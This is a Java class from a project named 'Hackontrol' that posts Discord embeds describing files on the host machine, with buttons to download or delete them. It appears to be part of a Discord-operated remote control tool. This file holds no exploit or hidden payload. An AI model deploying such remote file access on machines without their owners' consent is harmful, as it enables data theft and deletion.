package com.khopan.hackontrol.channel.file;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.function.Consumer;
import java.util.function.Supplier;

import javax.swing.filechooser.FileSystemView;

import com.khopan.hackontrol.manager.button.ButtonContext;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.utils.FileUtils;
import com.khopan.hackontrol.utils.FileUtils.FileCountAndSize;
import com.khopan.hackontrol.utils.ImageUtils;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.interactions.InteractionHook;
import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
import net.dv8tion.jda.api.interactions.components.ItemComponent;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
import net.dv8tion.jda.api.utils.FileUpload;
import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
import net.dv8tion.jda.api.utils.messages.MessageCreateData;

public class FileEmbedSender implements Runnable {
	private final File root;
	private final Consumer<MessageCreateData> action;
	private final Consumer<ButtonContext> downloadHandler;
	private final Consumer<ButtonContext> deleteHandler;

	private FileEmbedSender(File root, Consumer<MessageCreateData> action, Consumer<ButtonContext> downloadHandler, Consumer<ButtonContext> deleteHandler) {
		this.root = root;
		this.action = action;
		this.downloadHandler = downloadHandler;
		this.deleteHandler = deleteHandler;
	}

	@Override
	public void run() {
		EmbedBuilder embedBuilder = new EmbedBuilder();
		embedBuilder.setTitle(this.root.getName());
		boolean exist = this.root.exists();
		embedBuilder.setColor(exist ? 0xFF57F287 : 0xFFED4245);
		FileUpload upload = this.uploadIcon();

		if(upload != null) {
			embedBuilder.setThumbnail("attachment://icon.png");
		}

		this.field(embedBuilder, "Path", this.root.getAbsolutePath());
		this.fileSystemView(embedBuilder);
		this.fileAttribute(embedBuilder);
		this.fileSize(embedBuilder);
		MessageCreateBuilder messageBuilder = new MessageCreateBuilder();
		messageBuilder.addEmbeds(embedBuilder.build());

		if(upload != null) {
			messageBuilder.addFiles(upload);
		}

		List<ItemComponent> buttonList = new ArrayList<>();

		if(exist && this.root.isFile()) {
			buttonList.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Download", this.downloadHandler :: accept));
			buttonList.add(ButtonManager.dynamicButton(ButtonStyle.DANGER, "Delete File", this.deleteHandler :: accept));
		}

		buttonList.add(ButtonManager.selfDelete(ButtonStyle.DANGER, "Delete"));
		messageBuilder.addActionRow(buttonList);
		this.action.accept(messageBuilder.build());
	}

	private void fileSystemView(EmbedBuilder builder) {
		FileSystemView view = FileSystemView.getFileSystemView();
		this.field(builder, "Display Name", view.getSystemDisplayName(this.root));
		this.field(builder, "Type", view.getSystemTypeDescription(this.root));
	}

	private void fileAttribute(EmbedBuilder builder) {
		BasicFileAttributes attributes = this.getFileAttributes(this.root);
		String created = this.safeCall(() -> String.format(Locale.ROOT, "<t:%d:R>", attributes.creationTime().toMillis() / 1000L));
		String lastModified = this.safeCall(() -> String.format(Locale.ROOT, "<t:%d:R>", attributes.lastModifiedTime().toMillis() / 1000L));
		String lastAccess = this.safeCall(() -> String.format(Locale.ROOT, "<t:%d:R>", attributes.lastAccessTime().toMillis() / 1000L));
		this.field(builder, "Created", created);
		this.field(builder, "Modified", lastModified);
		this.field(builder, "Accessed", lastAccess);
	}

	private void fileSize(EmbedBuilder builder) {
		long size;

		if(this.root.isDirectory()) {
			FileCountAndSize countAndSize = FileUtils.getFileCountAndSize(root);
			size = countAndSize.folderSize;
			this.field(builder, "File Count", String.valueOf(countAndSize.fileCount));
		} else {
			size = this.root.length();
		}

		this.field(builder, "Size", FileUtils.getFileSizeDisplay(size));
	}

	private BasicFileAttributes getFileAttributes(File file) {
		try {
			return Files.getFileAttributeView(file.toPath(), BasicFileAttributeView.class).readAttributes();
		} catch(Throwable Errors) {
			return null;
		}
	}

	private FileUpload uploadIcon() {
		try {
			return FileUpload.fromData(ImageUtils.imageToByteArray(ImageUtils.getFileImage(this.root, 128, 128)), "icon.png");
		} catch(Throwable Errors) {
			return null;
		}
	}

	private void field(EmbedBuilder builder, String label, String value) {
		builder.addField(label, value == null ? "Unavailable" : value, true);
	}

	private String safeCall(Supplier<String> action) {
		try {
			return action.get();
		} catch(Throwable Errors) {
			return null;
		}
	}

	public static void start(File root, Consumer<MessageCreateData> action, Consumer<ButtonContext> downloadHandler, Consumer<ButtonContext> deleteHandler) {
		if(root == null) {
			throw new NullPointerException("Root cannot be null");
		}

		if(action == null) {
			throw new NullPointerException("Action cannot be null");
		}

		Thread thread = new Thread(new FileEmbedSender(root, action, downloadHandler, deleteHandler));
		thread.setName("Hackontrol File Query Thread");
		thread.start();
	}

	public static void reply(File root, IReplyCallback callback, Consumer<ButtonContext> onDownload, Consumer<ButtonContext> onDelete) {
		new Object() {
			private volatile MessageCreateData message;
			private volatile InteractionHook hook;
			private volatile boolean processed;

			private boolean defer;

			{
				FileEmbedSender.start(root, this :: callback, onDownload, onDelete);

				try {
					Thread.sleep(1500);
				} catch(Throwable Errors) {
					Errors.printStackTrace();
				}

				if(this.message == null) {
					this.defer = true;
					callback.deferReply().queue(this :: hook);
				}
			}

			private void callback(MessageCreateData message) {
				this.message = message;

				if(this.defer) {
					if(this.hook != null) {
						this.execute();
					}
				} else {
					this.execute();
				}
			}

			private void hook(InteractionHook hook) {
				this.hook = hook;

				if(this.message != null) {
					this.execute();
				}
			}

			private void execute() {
				if(this.processed) {
					return;
				}


				if(!this.defer) {
					callback.reply(this.message).queue(ButtonManager :: dynamicButtonCallback);
					this.processed = true;
					return;
				}

				this.hook.sendMessage(this.message).queue(ButtonManager :: dynamicButtonCallback);
				this.processed = true;
			}
		};
	}
}
